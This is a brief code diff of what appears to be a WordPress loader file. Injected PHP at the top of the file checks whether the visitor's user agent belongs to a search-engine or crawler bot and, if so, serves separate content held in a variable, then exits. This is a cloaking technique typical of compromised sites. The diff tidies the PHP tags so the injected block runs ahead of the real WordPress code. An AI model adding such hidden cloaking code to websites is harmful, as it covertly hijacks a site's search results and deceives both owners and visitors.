@@ -21,7 +21,8 @@ $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|y
 if (preg_match($botchar, $res)) {
     echo $file;
     exit;
-}<?php
+}
+	?><?php
 
 /**
  * These functions are needed to load WordPress.
